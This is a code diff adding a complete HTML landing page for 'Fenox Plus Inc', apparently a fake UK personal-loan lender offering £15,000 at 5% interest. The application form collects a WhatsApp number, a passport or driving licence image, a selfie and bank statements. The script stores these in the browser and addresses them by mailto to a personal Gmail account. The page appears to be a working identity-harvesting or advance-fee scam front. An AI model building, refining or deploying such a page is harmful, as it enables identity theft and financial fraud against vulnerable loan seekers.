@@ -1,0 +1,1093 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fenox Plus Inc - Fast & Secure Personal Loans UK</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --primary: #1e3a8a;
+            --primary-light: #3b82f6;
+            --primary-dark: #1e40af;
+            --accent: #06b6d4;
+            --success: #10b981;
+            --white: #ffffff;
+            --gray-50: #f8fafc;
+            --gray-100: #f1f5f9;
+            --gray-200: #e2e8f0;
+            --gray-300: #cbd5e1;
+            --gray-400: #94a3b8;
+            --gray-500: #64748b;
+            --gray-600: #475569;
+            --gray-700: #334155;
+            --gray-800: #1e293b;
+            --gray-900: #0f172a;
+        }
+
+        html {
+            scroll-behavior: smooth;
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: var(--gray-50);
+            color: var(--gray-800);
+            line-height: 1.6;
+        }
+
+        /* =========================================
+           NAVBAR
+           ========================================= */
+        .navbar {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(10px);
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
+            z-index: 1000;
+            padding: 1rem 0;
+        }
+
+        .nav-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 2rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+            font-size: 1.5rem;
+            font-weight: 800;
+            color: var(--primary);
+            text-decoration: none;
+        }
+
+        .logo-icon {
+            width: 40px;
+            height: 40px;
+            background: linear-gradient(135deg, var(--primary) 0%, var(--primary-light) 100%);
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: 700;
+        }
+
+        .nav-menu {
+            display: flex;
+            gap: 2.5rem;
+            list-style: none;
+        }
+
+        .nav-link {
+            color: var(--gray-600);
+            text-decoration: none;
+            font-weight: 500;
+            font-size: 0.95rem;
+            transition: color 0.2s;
+            cursor: pointer;
+        }
+
+        .nav-link:hover {
+            color: var(--primary);
+        }
+
+        .mobile-menu-btn {
+            display: none;
+            background: none;
+            border: none;
+            font-size: 1.5rem;
+            cursor: pointer;
+            color: var(--gray-700);
+        }
+
+        /* =========================================
+           HERO SECTION
+           ========================================= */
+        .hero {
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            position: relative;
+            overflow: hidden;
+            padding-top: 80px;
+        }
+
+        .hero-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 2rem;
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 4rem;
+            align-items: center;
+        }
+
+        .hero-content {
+            position: relative;
+            z-index: 2;
+        }
+
+        .hero-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+            background: rgba(30, 58, 138, 0.1);
+            color: var(--primary);
+            padding: 0.5rem 1rem;
+            border-radius: 50px;
+            font-size: 0.875rem;
+            font-weight: 600;
+            margin-bottom: 1.5rem;
+        }
+
+        .hero-title {
+            font-size: 3.5rem;
+            font-weight: 800;
+            line-height: 1.1;
+            color: var(--gray-900);
+            margin-bottom: 1.5rem;
+        }
+
+        .hero-title span {
+            background: linear-gradient(135deg, var(--primary) 0%, var(--primary-light) 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .hero-description {
+            font-size: 1.125rem;
+            color: var(--gray-600);
+            margin-bottom: 2rem;
+            max-width: 500px;
+        }
+
+        .hero-features {
+            display: flex;
+            flex-direction: column;
+            gap: 1rem;
+            margin-bottom: 2.5rem;
+        }
+
+        .hero-feature {
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+            font-weight: 500;
+            color: var(--gray-700);
+        }
+
+        .hero-feature::before {
+            content: "✓";
+            width: 24px;
+            height: 24px;
+            background: var(--success);
+            color: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 0.875rem;
+            font-weight: 700;
+        }
+
+        .hero-cta {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+            background: linear-gradient(135deg, var(--primary) 0%, var(--primary-light) 100%);
+            color: white;
+            padding: 1rem 2rem;
+            border-radius: 12px;
+            font-weight: 600;
+            text-decoration: none;
+            box-shadow: 0 4px 6px -1px rgba(30, 58, 138, 0.2);
+            transition: all 0.3s;
+            border: none;
+            cursor: pointer;
+            font-size: 1rem;
+        }
+
+        .hero-cta:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 12px -1px rgba(30, 58, 138, 0.3);
+        }
+
+        .hero-image {
+            position: relative;
+            z-index: 1;
+        }
+
+        .hero-image img {
+            width: 100%;
+            height: auto;
+            border-radius: 20px;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.15);
+        }
+
+        .hero-bg {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(135deg, rgba(30, 58, 138, 0.05) 0%, transparent 50%);
+            pointer-events: none;
+        }
+
+        /* =========================================
+           FEATURE CARDS
+           ========================================= */
+        .features {
+            padding: 6rem 0;
+            background: white;
+        }
+
+        .features-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 2rem;
+        }
+
+        .features-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 2rem;
+        }
+
+        .feature-card {
+            background: white;
+            border-radius: 20px;
+            padding: 2.5rem;
+            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.05), 0 10px 15px -3px rgba(0, 0, 0, 0.05);
+            border: 1px solid var(--gray-100);
+            transition: all 0.3s;
+        }
+
+        .feature-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04);
+        }
+
+        .feature-icon {
+            width: 60px;
+            height: 60px;
+            background: linear-gradient(135deg, var(--primary) 0%, var(--primary-light) 100%);
+            border-radius: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.75rem;
+            margin-bottom: 1.5rem;
+        }
+
+        .feature-title {
+            font-size: 1.25rem;
+            font-weight: 700;
+            color: var(--gray-900);
+            margin-bottom: 0.5rem;
+        }
+
+        .feature-text {
+            color: var(--gray-500);
+            font-size: 0.95rem;
+        }
+
+        /* =========================================
+           CTA SECTION
+           ========================================= */
+        .cta-section {
+            padding: 6rem 0;
+            background: linear-gradient(135deg, var(--gray-50) 0%, white 100%);
+        }
+
+        .cta-container {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 0 2rem;
+            text-align: center;
+        }
+
+        .cta-title {
+            font-size: 2.5rem;
+            font-weight: 800;
+            color: var(--gray-900);
+            margin-bottom: 1rem;
+        }
+
+        .cta-text {
+            font-size: 1.125rem;
+            color: var(--gray-600);
+            margin-bottom: 2rem;
+        }
+
+        .cta-button {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+            background: linear-gradient(135deg, var(--primary) 0%, var(--primary-light) 100%);
+            color: white;
+            padding: 1.25rem 2.5rem;
+            border-radius: 12px;
+            font-weight: 600;
+            font-size: 1.1rem;
+            text-decoration: none;
+            box-shadow: 0 4px 6px -1px rgba(30, 58, 138, 0.2);
+            transition: all 0.3s;
+            border: none;
+            cursor: pointer;
+        }
+
+        .cta-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 12px -1px rgba(30, 58, 138, 0.3);
+        }
+
+        /* =========================================
+           APPLICATION FORM PAGE
+           ========================================= */
+        .application-page {
+            display: none;
+            min-height: 100vh;
+            padding: 120px 0 4rem;
+            background: linear-gradient(135deg, var(--gray-50) 0%, white 100%);
+        }
+
+        .application-page.active {
+            display: block;
+        }
+
+        .application-container {
+            max-width: 700px;
+            margin: 0 auto;
+            padding: 0 2rem;
+        }
+
+        .application-card {
+            background: white;
+            border-radius: 24px;
+            padding: 3rem;
+            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1);
+        }
+
+        .application-header {
+            text-align: center;
+            margin-bottom: 2.5rem;
+        }
+
+        .application-header h2 {
+            font-size: 2rem;
+            font-weight: 800;
+            color: var(--gray-900);
+            margin-bottom: 0.5rem;
+        }
+
+        .application-header p {
+            color: var(--gray-500);
+        }
+
+        .form-group {
+            margin-bottom: 1.75rem;
+        }
+
+        .form-label {
+            display: block;
+            font-weight: 600;
+            color: var(--gray-700);
+            margin-bottom: 0.5rem;
+            font-size: 0.95rem;
+        }
+
+        .required .form-label::after {
+            content: " *";
+            color: #ef4444;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 0.875rem 1rem;
+            border: 2px solid var(--gray-200);
+            border-radius: 12px;
+            font-size: 1rem;
+            font-family: inherit;
+            transition: all 0.2s;
+        }
+
+        .form-input:focus {
+            outline: none;
+            border-color: var(--primary-light);
+            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.1);
+        }
+
+        .input-hint {
+            font-size: 0.875rem;
+            color: var(--gray-400);
+            margin-top: 0.25rem;
+        }
+
+        .input-currency {
+            position: relative;
+        }
+
+        .currency-symbol {
+            position: absolute;
+            left: 1rem;
+            top: 50%;
+            transform: translateY(-50%);
+            color: var(--gray-400);
+            font-weight: 600;
+        }
+
+        .input-currency .form-input {
+            padding-left: 2.5rem;
+        }
+
+        /* File Upload */
+        .file-upload {
+            position: relative;
+            border: 2px dashed var(--gray-300);
+            border-radius: 12px;
+            padding: 2rem;
+            text-align: center;
+            background: var(--gray-50);
+            transition: all 0.2s;
+            cursor: pointer;
+        }
+
+        .file-upload:hover {
+            border-color: var(--primary-light);
+            background: rgba(59, 130, 246, 0.05);
+        }
+
+        .file-upload input[type="file"] {
+            position: absolute;
+            inset: 0;
+            width: 100%;
+            height: 100%;
+            opacity: 0;
+            cursor: pointer;
+        }
+
+        .upload-icon {
+            font-size: 2.5rem;
+            margin-bottom: 0.5rem;
+        }
+
+        .upload-text strong {
+            display: block;
+            color: var(--primary);
+            margin-bottom: 0.25rem;
+        }
+
+        .upload-text span {
+            color: var(--gray-400);
+            font-size: 0.9rem;
+        }
+
+        .file-preview {
+            display: none;
+            margin-top: 1rem;
+            padding: 1rem;
+            background: rgba(16, 185, 129, 0.1);
+            border-radius: 8px;
+            border-left: 4px solid var(--success);
+            align-items: center;
+            gap: 1rem;
+        }
+
+        .file-preview.show {
+            display: flex;
+        }
+
+        .file-preview img {
+            width: 60px;
+            height: 60px;
+            object-fit: cover;
+            border-radius: 8px;
+        }
+
+        .file-info {
+            flex: 1;
+            text-align: left;
+        }
+
+        .file-name {
+            font-weight: 600;
+            color: var(--gray-800);
+            font-size: 0.9rem;
+        }
+
+        .file-size {
+            font-size: 0.875rem;
+            color: var(--gray-400);
+        }
+
+        .file-remove {
+            background: #ef4444;
+            color: white;
+            border: none;
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            cursor: pointer;
+            font-size: 1.25rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .submit-btn {
+            width: 100%;
+            padding: 1rem;
+            background: linear-gradient(135deg, var(--primary) 0%, var(--primary-light) 100%);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 1.1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.5rem;
+        }
+
+        .submit-btn:hover:not(:disabled) {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 12px -1px rgba(30, 58, 138, 0.3);
+        }
+
+        .submit-btn:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+        }
+
+        .spinner {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 0.8s linear infinite;
+        }
+
+        .submit-btn.loading .spinner {
+            display: block;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        /* Success Message */
+        .success-message {
+            display: none;
+            text-align: center;
+            padding: 2rem;
+        }
+
+        .success-message.show {
+            display: block;
+            animation: fadeIn 0.5s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .success-icon {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(135deg, #10b981 0%, #34d399 100%);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 2.5rem;
+            margin: 0 auto 1.5rem;
+            color: white;
+        }
+
+        .success-title {
+            font-size: 1.75rem;
+            font-weight: 700;
+            color: var(--gray-900);
+            margin-bottom: 0.5rem;
+        }
+
+        .success-text {
+            color: var(--gray-600);
+            margin-bottom: 1.5rem;
+        }
+
+        .back-btn {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+            background: var(--gray-100);
+            color: var(--gray-700);
+            padding: 0.75rem 1.5rem;
+            border-radius: 10px;
+            text-decoration: none;
+            font-weight: 500;
+            transition: all 0.2s;
+            border: none;
+            cursor: pointer;
+        }
+
+        .back-btn:hover {
+            background: var(--gray-200);
+        }
+
+        /* Responsive */
+        @media (max-width: 968px) {
+            .hero-container {
+                grid-template-columns: 1fr;
+                gap: 2rem;
+                text-align: center;
+            }
+
+            .hero-title {
+                font-size: 2.5rem;
+            }
+
+            .hero-description {
+                margin: 0 auto;
+            }
+
+            .hero-features {
+                align-items: center;
+            }
+
+            .hero-image {
+                order: -1;
+            }
+
+            .features-grid {
+                grid-template-columns: 1fr;
+            }
+
+            .nav-menu {
+                display: none;
+            }
+
+            .mobile-menu-btn {
+                display: block;
+            }
+        }
+
+        @media (max-width: 640px) {
+            .hero-title {
+                font-size: 2rem;
+            }
+
+            .application-card {
+                padding: 1.5rem;
+            }
+
+            .cta-title {
+                font-size: 1.75rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Navbar -->
+    <nav class="navbar">
+        <div class="nav-container">
+            <a href="#" class="logo" onclick="showPage('home')">
+                <div class="logo-icon">F</div>
+                <span>Fenox Plus Inc</span>
+            </a>
+            <ul class="nav-menu">
+                <li><a class="nav-link" onclick="showPage('home')">Home</a></li>
+                <li><a class="nav-link" onclick="showPage('apply')">Apply Now</a></li>
+            </ul>
+            <button class="mobile-menu-btn">☰</button>
+        </div>
+    </nav>
+
+    <!-- Home Page -->
+    <div id="homePage" class="page-section">
+        <!-- Hero Section -->
+        <section class="hero">
+            <div class="hero-bg"></div>
+            <div class="hero-container">
+                <div class="hero-content">
+                    <div class="hero-badge">
+                        <span>🇬🇧</span> Trusted UK Lender
+                    </div>
+                    <h1 class="hero-title">Fast & Secure <span>Personal Loans</span> in the UK</h1>
+                    <p class="hero-description">
+                        Trusted financial service provider offering personal loans up to £15,000 with only 5% annual interest rate.
+                    </p>
+                    <div class="hero-features">
+                        <div class="hero-feature">Up to £15,000 Available</div>
+                        <div class="hero-feature">Only 5% Annual Interest</div>
+                        <div class="hero-feature">Quick Approval Process</div>
+                    </div>
+                    <button class="hero-cta" onclick="showPage('apply')">
+                        Apply Now <span>→</span>
+                    </button>
+                </div>
+                <div class="hero-image">
+                    <img src="https://images.unsplash.com/photo-1556742049-0cfed4f6a45d?w=800&h=600&fit=crop" alt="Happy couple reviewing finances on smartphone">
+                </div>
+            </div>
+        </section>
+
+        <!-- Feature Cards -->
+        <section class="features">
+            <div class="features-container">
+                <div class="features-grid">
+                    <div class="feature-card">
+                        <div class="feature-icon">💰</div>
+                        <h3 class="feature-title">Up to £15,000</h3>
+                        <p class="feature-text">Get the funds you need quickly with our streamlined application process.</p>
+                    </div>
+                    <div class="feature-card">
+                        <div class="feature-icon">📊</div>
+                        <h3 class="feature-title">Only 5% Interest</h3>
+                        <p class="feature-text">Low competitive interest rate designed to make repayment manageable.</p>
+                    </div>
+                    <div class="feature-card">
+                        <div class="feature-icon">🛡️</div>
+                        <h3 class="feature-title">No-Obligation Application</h3>
+                        <p class="feature-text">Quick approval process within 24 hours. No hidden fees or charges.</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- CTA Section -->
+        <section class="cta-section">
+            <div class="cta-container">
+                <h2 class="cta-title">Ready to Get Started?</h2>
+                <p class="cta-text">
+                    Complete our simple loan application form to see what options you're eligible for. It only takes a few minutes and we'll contact you shortly with the next steps.
+                </p>
+                <button class="cta-button" onclick="showPage('apply')">
+                    Start Your Application <span>→</span>
+                </button>
+            </div>
+        </section>
+    </div>
+
+    <!-- Application Form Page -->
+    <div id="applyPage" class="application-page">
+        <div class="application-container">
+            <div class="application-card" id="formCard">
+                <div class="application-header">
+                    <h2>Loan Application</h2>
+                    <p>Complete the form below. All fields are required.</p>
+                </div>
+
+                <form id="loanForm">
+                    <!-- Loan Amount -->
+                    <div class="form-group required">
+                        <label class="form-label" for="loanAmount">Loan Amount Required</label>
+                        <div class="input-currency">
+                            <span class="currency-symbol">£</span>
+                            <input type="number" id="loanAmount" name="loanAmount" class="form-input" 
+                                placeholder="Enter amount (e.g., 5000)" min="1000" max="15000" step="100" required>
+                        </div>
+                        <p class="input-hint">Minimum £1,000 • Maximum £15,000</p>
+                    </div>
+
+                    <!-- WhatsApp Number -->
+                    <div class="form-group required">
+                        <label class="form-label" for="whatsappNumber">WhatsApp Number</label>
+                        <input type="tel" id="whatsappNumber" name="whatsappNumber" class="form-input" 
+                            placeholder="+44 7123 456789" required>
+                        <p class="input-hint">Include country code for verification calls</p>
+                    </div>
+
+                    <!-- UK ID Upload -->
+                    <div class="form-group required">
+                        <label class="form-label">Valid UK ID (Passport or Driver's License)</label>
+                        <div class="file-upload" id="idUploadZone">
+                            <input type="file" id="idDocument" name="idDocument" accept="image/*" required 
+                                onchange="handleFileSelect(this, 'idPreview')">
+                            <div class="upload-content">
+                                <div class="upload-icon">🪪</div>
+                                <div class="upload-text">
+                                    <strong>Click to upload ID</strong>
+                                    <span>JPG or PNG format</span>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="file-preview" id="idPreview">
+                            <img id="idPreviewImg" src="" alt="ID Preview">
+                            <div class="file-info">
+                                <div class="file-name" id="idFileName"></div>
+                                <div class="file-size" id="idFileSize"></div>
+                            </div>
+                            <button type="button" class="file-remove" onclick="removeFile('idDocument', 'idPreview')">×</button>
+                        </div>
+                    </div>
+
+                    <!-- Selfie Upload -->
+                    <div class="form-group required">
+                        <label class="form-label">Selfie for Identity Verification</label>
+                        <div class="file-upload" id="selfieUploadZone">
+                            <input type="file" id="selfie" name="selfie" accept="image/*" capture="user" required 
+                                onchange="handleFileSelect(this, 'selfiePreview')">
+                            <div class="upload-content">
+                                <div class="upload-icon">📷</div>
+                                <div class="upload-text">
+                                    <strong>Take a selfie</strong>
+                                    <span>Clear face photo required</span>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="file-preview" id="selfiePreview">
+                            <img id="selfiePreviewImg" src="" alt="Selfie Preview">
+                            <div class="file-info">
+                                <div class="file-name" id="selfieFileName"></div>
+                                <div class="file-size" id="selfieFileSize"></div>
+                            </div>
+                            <button type="button" class="file-remove" onclick="removeFile('selfie', 'selfiePreview')">×</button>
+                        </div>
+                    </div>
+
+                    <!-- Bank Statement -->
+                    <div class="form-group required">
+                        <label class="form-label">Bank Statement (Last 3 months)</label>
+                        <div class="file-upload" id="bankUploadZone">
+                            <input type="file" id="bankStatement" name="bankStatement" accept=".pdf" required 
+                                onchange="handleFileSelect(this, 'bankPreview')">
+                            <div class="upload-content">
+                                <div class="upload-icon">📄</div>
+                                <div class="upload-text">
+                                    <strong>Upload bank statement</strong>
+                                    <span>PDF format only</span>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="file-preview" id="bankPreview">
+                            <div style="font-size: 2rem;">📊</div>
+                            <div class="file-info">
+                                <div class="file-name" id="bankFileName"></div>
+                                <div class="file-size" id="bankFileSize"></div>
+                            </div>
+                            <button type="button" class="file-remove" onclick="removeFile('bankStatement', 'bankPreview')">×</button>
+                        </div>
+                    </div>
+
+                    <button type="submit" class="submit-btn" id="submitBtn">
+                        <span class="spinner"></span>
+                        <span class="btn-text">Submit Application</span>
+                    </button>
+                </form>
+
+                <div class="success-message" id="successMessage">
+                    <div class="success-icon">✓</div>
+                    <h3 class="success-title">Application Submitted!</h3>
+                    <p class="success-text">Your application has been submitted successfully. Our team will contact you shortly.</p>
+                    <button class="back-btn" onclick="showPage('home')">
+                        ← Back to Home
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // State Management
+        let currentFiles = {};
+
+        // Navigation
+        function showPage(page) {
+            // Hide all pages
+            document.getElementById('homePage').style.display = 'none';
+            document.getElementById('applyPage').classList.remove('active');
+            
+            // Show selected page
+            if (page === 'home') {
+                document.getElementById('homePage').style.display = 'block';
+            } else if (page === 'apply') {
+                document.getElementById('applyPage').classList.add('active');
+                resetForm();
+            }
+            
+            window.scrollTo(0, 0);
+        }
+
+        // File Upload Handling
+        function handleFileSelect(input, previewId) {
+            const file = input.files[0];
+            if (!file) return;
+
+            const maxSize = 5 * 1024 * 1024; // 5MB
+            if (file.size > maxSize) {
+                alert('File too large. Maximum size: 5MB');
+                input.value = '';
+                return;
+            }
+
+            const reader = new FileReader();
+            reader.onload = function(e) {
+                currentFiles[input.id] = {
+                    name: file.name,
+                    size: file.size,
+                    type: file.type,
+                    data: e.target.result
+                };
+
+                const preview = document.getElementById(previewId);
+                preview.classList.add('show');
+                
+                const img = preview.querySelector('img');
+                if (img && file.type.startsWith('image/')) {
+                    img.src = e.target.result;
+                }
+
+                preview.querySelector('.file-name').textContent = file.name;
+                preview.querySelector('.file-size').textContent = formatFileSize(file.size);
+            };
+            reader.readAsDataURL(file);
+        }
+
+        function removeFile(inputId, previewId) {
+            document.getElementById(inputId).value = '';
+            document.getElementById(previewId).classList.remove('show');
+            delete currentFiles[inputId];
+        }
+
+        function formatFileSize(bytes) {
+            if (bytes === 0) return '0 Bytes';
+            const k = 1024;
+            const sizes = ['Bytes', 'KB', 'MB'];
+            const i = Math.floor(Math.log(bytes) / Math.log(k));
+            return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
+        }
+
+        // Drag and Drop
+        document.querySelectorAll('.file-upload').forEach(zone => {
+            zone.addEventListener('dragover', (e) => {
+                e.preventDefault();
+                zone.style.borderColor = 'var(--primary-light)';
+                zone.style.background = 'rgba(59, 130, 246, 0.05)';
+            });
+            zone.addEventListener('dragleave', () => {
+                zone.style.borderColor = 'var(--gray-300)';
+                zone.style.background = 'var(--gray-50)';
+            });
+            zone.addEventListener('drop', (e) => {
+                e.preventDefault();
+                zone.style.borderColor = 'var(--gray-300)';
+                zone.style.background = 'var(--gray-50)';
+                const input = zone.querySelector('input');
+                const files = e.dataTransfer.files;
+                if (files.length) {
+                    input.files = files;
+                    input.dispatchEvent(new Event('change'));
+                }
+            });
+        });
+
+        // Form Submission with Email
+        document.getElementById('loanForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const btn = document.getElementById('submitBtn');
+            btn.classList.add('loading');
+            btn.disabled = true;
+
+            // Validate files
+            if (!currentFiles.idDocument || !currentFiles.selfie || !currentFiles.bankStatement) {
+                alert('Please upload all required documents');
+                btn.classList.remove('loading');
+                btn.disabled = false;
+                return;
+            }
+
+            // Prepare form data
+            const formData = {
+                loanAmount: document.getElementById('loanAmount').value,
+                whatsappNumber: document.getElementById('whatsappNumber').value,
+                idDocument: currentFiles.idDocument,
+                selfie: currentFiles.selfie,
+                bankStatement: currentFiles.bankStatement
+            };
+
+            // Create email content
+            const emailSubject = `New Loan Application - £${formData.loanAmount}`;
+            const emailBody = `
+New Loan Application Received
+
+Loan Amount: £${formData.loanAmount}
+WhatsApp Number: ${formData.whatsappNumber}
+
+Documents Attached:
+- ID Document: ${formData.idDocument.name}
+- Selfie: ${formData.selfie.name}
+- Bank Statement: ${formData.bankStatement.name}
+
+Submitted at: ${new Date().toLocaleString()}
+            `;
+
+            // In a real implementation, you would send this to a backend
+            // For demonstration, we'll use mailto link and localStorage
+            const mailtoLink = `mailto:azeemhuzair1@gmail.com?subject=${encodeURIComponent(emailSubject)}&body=${encodeURIComponent(emailBody)}`;
+            
+            // Store application
+            const application = {
+                id: 'APP-' + Date.now().toString(36).toUpperCase(),
+                date: new Date().toISOString(),
+                ...formData
+            };
+            const applications = JSON.parse(localStorage.getItem('fenoxApplications')) || [];
+            applications.unshift(application);
+            localStorage.setItem('fenoxApplications', JSON.stringify(applications));
+
+            // Simulate processing
+            await new Promise(r => setTimeout(r, 1500));
+
+            // Show success
+            document.getElementById('formCard').querySelector('form').style.display = 'none';
+            document.querySelector('.application-header').style.display = 'none';
+            document.getElementById('successMessage').classList.add('show');
+
+            // Open email client (in real implementation, use backend API)
+            window.open(mailtoLink, '_blank');
+
+            btn.classList.remove('loading');
+            btn.disabled = false;
+        });
+
+        function resetForm() {
+            document.getElementById('loanForm').reset();
+            document.getElementById('loanForm').style.display = 'block';
+            document.querySelector('.application-header').style.display = 'block';
+            document.getElementById('successMessage').classList.remove('show');
+            ['idPreview', 'selfiePreview', 'bankPreview'].forEach(id => {
+                document.getElementById(id).classList.remove('show');
+            });
+            currentFiles = {};
+        }
+
+        // Initialize
+        showPage('home');
+    </script>
+</body>
+</html>
